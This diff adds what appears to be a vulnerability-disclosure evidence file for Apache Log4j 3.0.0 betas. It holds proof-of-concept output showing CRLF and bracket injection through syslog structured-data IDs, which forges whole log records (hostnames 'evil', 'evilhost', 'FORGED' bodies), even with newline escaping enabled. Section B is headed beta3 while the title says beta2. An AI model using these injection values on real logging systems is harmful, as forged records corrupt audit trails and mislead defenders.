@@ -1,0 +1,293 @@
+# Evidence — PoC transcripts, Apache Log4j 3.0.0-beta2
+
+Generated 2026-10-23T14:07:03Z on Linux 7.3.0-9-generic x86_64.
+java: openjdk version "21.0.12.1" 2026-08-18
+
+Identical PoC source as the 2.x run; only the Log4j artifacts differ.
+
+## A. Log4j 3.0.0-beta2 - network syslog over TCP (RFC 6587, `SocketAppender`)
+
+### mode `baseline`
+
+```
+    total bytes: 72
+    repr       : b'<134>1 2026-10-23T10:07:07.324-04:00 death app 36293 v [goodId@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:07.324-04:00 death app 36293 v [goodId@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:07.324-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36293
+      MSGID     : v
+      SD        : [goodId@32473]
+      MSG       : k
+```
+
+### mode `breakout`
+
+```
+    total bytes: 96
+    repr       : b'<134>1 2026-10-23T10:07:11.833-04:00 death app 36323 v [x] INJECTED 1 - host app - - -@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:11.833-04:00 death app 36323 v [x] INJECTED 1 - host app - - -@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:11.833-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36323
+      MSGID     : v
+      SD        : [x]
+      MSG       : INJECTED 1 - host app - - -@32473] k
+```
+
+### mode `crlf`
+
+```
+    total bytes: 98
+    repr       : b'<134>1 2026-10-23T10:07:16.518-04:00 death app 36353 v [x]\r\n<134>1 FORGED host app - - -@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:16.518-04:00 death app 36353 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:16.518-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36353
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<134>1 FORGED host app - - -@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : FORGED
+      HOSTNAME  : host
+      APP-NAME  : app
+      PROCID    : -
+      MSGID     : -
+      SD        : -@32473]
+      MSG       : k
+```
+
+### mode `forge32`
+
+```
+    total bytes: 94
+    repr       : b'<134>1 2026-10-23T10:07:21.032-04:00 death app 36386 v [x]\r\n<1>1 - evil - - - FORGED@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:21.032-04:00 death app 36386 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:21.032-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36386
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<1>1 - evil - - - FORGED@32473] k'
+      PRI       : <1>
+      VERSION   : 1
+      TIMESTAMP : -
+      HOSTNAME  : evil
+      APP-NAME  : -
+      PROCID    : -
+      MSGID     : -
+      SD        : FORGED@32473]
+      MSG       : k
+```
+
+### mode `forgebig`
+
+```
+    total bytes: 151
+    repr       : b'<134>1 2026-10-23T10:07:25.403-04:00 death app 36416 v [x]\r\n<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:25.403-04:00 death app 36416 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:25.403-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36416
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE@32473] k'
+      PRI       : <1>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T00:00:00Z
+      HOSTNAME  : evilhost
+      APP-NAME  : evilapp
+      PROCID    : 999
+      MSGID     : evilmsg
+      SD        : -
+      MSG       : FORGED MESSAGE BODY HERE@32473] k
+```
+
+### mode `einnl`
+
+```
+    total bytes: 78
+    repr       : b'<134>1 2026-10-23T10:07:29.960-04:00 death app 36451 v [id@1 evil\r\nINJECT2] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:29.960-04:00 death app 36451 v [id@1 evil\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:29.960-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36451
+      MSGID     : v
+      SD        : [id@1
+      MSG       : evil
+    line 1: b'INJECT2] k'
+```
+
+## B. Log4j 3.0.0-beta3 - network syslog over TCP, newline escaping ENABLED
+
+The 3.x configuration uses the renamed attributes (`includeNL` / `escapeNL`)
+and turns newline escaping ON. The SD-ID still injects a raw CRLF, which
+shows the bypass is independent of the escaping setting.
+
+### mode `baseline`
+
+```
+    total bytes: 72
+    repr       : b'<134>1 2026-10-23T10:07:34.642-04:00 death app 36481 v [goodId@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:34.642-04:00 death app 36481 v [goodId@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:34.642-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36481
+      MSGID     : v
+      SD        : [goodId@32473]
+      MSG       : k
+```
+
+### mode `breakout`
+
+```
+    total bytes: 96
+    repr       : b'<134>1 2026-10-23T10:07:39.313-04:00 death app 36515 v [x] INJECTED 1 - host app - - -@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:39.313-04:00 death app 36515 v [x] INJECTED 1 - host app - - -@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:39.313-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36515
+      MSGID     : v
+      SD        : [x]
+      MSG       : INJECTED 1 - host app - - -@32473] k
+```
+
+### mode `crlf`
+
+```
+    total bytes: 98
+    repr       : b'<134>1 2026-10-23T10:07:43.916-04:00 death app 36544 v [x]\r\n<134>1 FORGED host app - - -@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:43.916-04:00 death app 36544 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:43.916-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36544
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<134>1 FORGED host app - - -@32473] k'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : FORGED
+      HOSTNAME  : host
+      APP-NAME  : app
+      PROCID    : -
+      MSGID     : -
+      SD        : -@32473]
+      MSG       : k
+```
+
+### mode `forge32`
+
+```
+    total bytes: 94
+    repr       : b'<134>1 2026-10-23T10:07:48.563-04:00 death app 36577 v [x]\r\n<1>1 - evil - - - FORGED@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:48.563-04:00 death app 36577 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:48.563-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36577
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<1>1 - evil - - - FORGED@32473] k'
+      PRI       : <1>
+      VERSION   : 1
+      TIMESTAMP : -
+      HOSTNAME  : evil
+      APP-NAME  : -
+      PROCID    : -
+      MSGID     : -
+      SD        : FORGED@32473]
+      MSG       : k
+```
+
+### mode `forgebig`
+
+```
+    total bytes: 151
+    repr       : b'<134>1 2026-10-23T10:07:53.405-04:00 death app 36609 v [x]\r\n<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE@32473] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:53.405-04:00 death app 36609 v [x]\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:53.405-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36609
+      MSGID     : v
+      SD        : [x]
+      MSG       : 
+    line 1: b'<1>1 2026-10-23T00:00:00Z evilhost evilapp 999 evilmsg - FORGED MESSAGE BODY HERE@32473] k'
+      PRI       : <1>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T00:00:00Z
+      HOSTNAME  : evilhost
+      APP-NAME  : evilapp
+      PROCID    : 999
+      MSGID     : evilmsg
+      SD        : -
+      MSG       : FORGED MESSAGE BODY HERE@32473] k
+```
+
+### mode `einnl`
+
+```
+    total bytes: 78
+    repr       : b'<134>1 2026-10-23T10:07:58.221-04:00 death app 36709 v [id@1 evil\r\nINJECT2] k\n'
+
+    line 0: b'<134>1 2026-10-23T10:07:58.221-04:00 death app 36709 v [id@1 evil\r'
+      PRI       : <134>
+      VERSION   : 1
+      TIMESTAMP : 2026-10-23T10:07:58.221-04:00
+      HOSTNAME  : death
+      APP-NAME  : app
+      PROCID    : 36709
+      MSGID     : v
+      SD        : [id@1
+      MSG       : evil
+    line 1: b'INJECT2] k'
+```
+
